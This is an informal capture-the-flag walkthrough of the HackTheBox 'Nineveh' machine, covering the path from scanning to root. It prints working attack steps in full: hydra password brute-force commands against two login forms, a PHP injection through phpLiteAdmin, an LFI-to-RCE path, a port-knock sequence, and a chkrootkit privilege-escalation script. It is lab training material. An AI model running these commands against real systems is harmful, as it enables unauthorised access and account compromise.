Started with nmap scan
```
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:   d182:94b8:0210:7992:bf01:e802:b26f:8639
| SHA-1: 2275:b03e:27bd:1226:fdaa:8b0f:6de9:84f0:113b:42c0
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
Go to the website on port `80` its just a apache page saying it works going to the site with https and we get a picture running a scan on it 
```
/db/
/secure_notes/
```
The `/db/` is a `phpLiteAdmin` running version `1.9.3` found some exploits for this but we need to be authed to use them looking at `/secure_notes/` and its another folder with a picture running a gobuster scan did not find anything looking at the image running `binwalk nineveh.png` shows there is a `tar` archive in there so running `7z x nineveh.png` extracts to a folder called `secret` and there are a public and private key files its a ssh key and the `id_rsa` but we don't have ssh open so this don't get us much yet we can use hydra to try and crack the website since its just a password `hydra -l test -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In:F=Invalid Password" -s 443 -V -f` and we got the password of `password123` and we can login in now we have access to the sql database time for the exploit we can make a database called `hack.php` and then make a table and insert a txt filed with `<?php phpinfo()?>` but we don't have a way of getting to `hack.php` so time to run another gobuster scan on the `http` server 
```
/department/
```
and going to this we have a login page but we dont have a username testing this will tell us if we have a valid username so we have username enumeration now we can fuzz this or use caido 
```
admin
```
now we have a username we can try and bruteforce this site now also `hydra -l admin -P rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:F=Invalid Password" -V -f` and we have creds not for this `admin:1q2w3e4r5t` and after we login there is a notes and a notes pramater that is vulnerable to LFI `/ninevehNotes/../var/tmp/6.php&cmd=id` and we get `www-data` so now we have RCE we can do a reverse shell with this shell we just need to url encode the payload and we get a call back as `www-data` but a way better shell running linpeas shows us there is a port knocking program on here `knockd` now looking at `/etc/knockd.conf` we get the ports we need to hit to unlock SSH `571, 290, 911` and now SSH should be open `knock -v 10.10.10.43 571 290 911 -d 500` we can also ssh into the server from inside the rev shell `ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i nineveh.priv amrois@localhost` from the linpeas scan from earlier we know `chrootkit` is on the host and looking at exploit DB there is a exploit for it if we make a file called `update` in the `tmp` folder and put this in there
```
#!/bin/bash
cat /root/root.txt > /dev/shm/root.txt
```
and then `chmod +x /tmp/update` and wait a couple minutes we will have the root flag  